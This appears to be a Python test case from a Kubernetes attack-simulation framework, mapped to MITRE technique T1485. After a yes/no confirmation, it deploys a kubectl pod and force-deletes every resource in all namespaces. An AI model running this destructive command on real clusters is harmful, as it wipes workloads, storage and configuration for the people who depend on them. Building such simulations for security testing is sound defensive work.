from testing.testing import Testing
from prompt_toolkit import prompt
from prompt_toolkit.styles import Style
import time

class DataDestruction(Testing):
    def __init__(self):
        super().__init__()
        self.name = "Data Destruction"
        self.mitre_tactic = "TA0040"
        self.mitre_technique = "T1485"
        self.microsoft_technique = "MS-TA9038"
        self.pod = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {
                    "name": "data-destruction-pod"
                },
                "spec": {
                    "containers": [
                        {
                            "image": "bitnami/kubectl:latest",  # Image with kubectl pre-installed
                            "name": "kubectl-container",
                            "command": ["/bin/bash", "-c", "while true; do sleep 30; done;"]
                        }
                    ]
                }
            }
        
    def run_attack(self):
        if self.check_user_input() and self.check_install_kubectl():   

            print("# Creating Pod data-destruction-pod...")
            self.kubectl_create_file("data-destruction-pod.yaml",self.pod)
            self.kubectl_apply("data-destruction-pod.yaml")
        
            while not self.kubectl_is_pod_ready("data-destruction-pod"):
                time.sleep(1)
            
            print("# Destroying all resources across all namespaces in Kubernetes...")
            self.cmd = ["kubectl", "exec", "-it", "data-destruction-pod", "--", "/bin/bash", "-c", 'kubectl delete all --all --all-namespaces --grace-period=0 --force']
            output, error = self.kubectl_exec_command()
            print(output)

            if self.error:
                print("An Error has occured: " + error)
            else:
                self.output["kubectl delete all"] = output 
                
            # Cleanup
            self.cleanup()

        else:
            print("Anwer Yes to run the Testcase")

    def check_user_input(self):
        # Define the cursive style
        cursive_style = Style.from_dict({'prompt': 'italic'})

        # Make sure the user wants to destroy all resources
        answer = prompt('Do you want to destroy all Kubernetes Resources in the cluster including deployments, configurations, storage, and compute resources? (Yes/No) ',
                        style=cursive_style)

        if answer.lower() == 'yes' or answer.lower() == 'y':
            return True

        # Return the user's answer
        return False
    
    def cleanup(self):

        print("\n# Deleting ssh-lateral-movement.yaml...")
        self.delete_file("data-destruction-pod.yaml")


    def display_help(self):
        pass

    def check_prerequisites(self):
        pass

    def determine_executable_path(self):
        pass